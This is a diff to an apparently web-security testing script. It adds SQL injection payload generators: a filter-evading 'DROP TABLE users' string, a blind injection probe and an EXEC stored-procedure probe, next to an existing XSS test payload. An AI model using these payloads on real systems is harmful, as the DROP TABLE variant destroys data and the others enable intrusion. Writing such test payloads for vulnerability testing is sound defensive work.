@@ -80,6 +80,21 @@ $(document).ready(function() {
     return "a');"+ sql_debug(name)+"--";
   }
 
+  /* Bypass blacklisting. */
+  attacks[1][4] = function(name) {
+    return "a';DRO/*bypass blacklisting*/P TABLE users;"+ sql_debug(name)+"--";
+  }
+
+  /* Blind injection. */
+  attacks[1][5] = function(name) {
+    return "SELECT IF(1=1,'true','false');"+ sql_debug(name)+"--";
+  }
+
+  /* Exec blind injection. */
+  attacks[1][6] = function(name) {
+    return "1 EXEC SP_ (or EXEC XP_);"+ sql_debug(name)+"--";
+  }
+
   /* Basic XSS */
   attacks[2][0] = function(name) {
     return "<script>console.log('"+name+" is vulnerable to XSS.');"+js_debug(name)+"</script>";
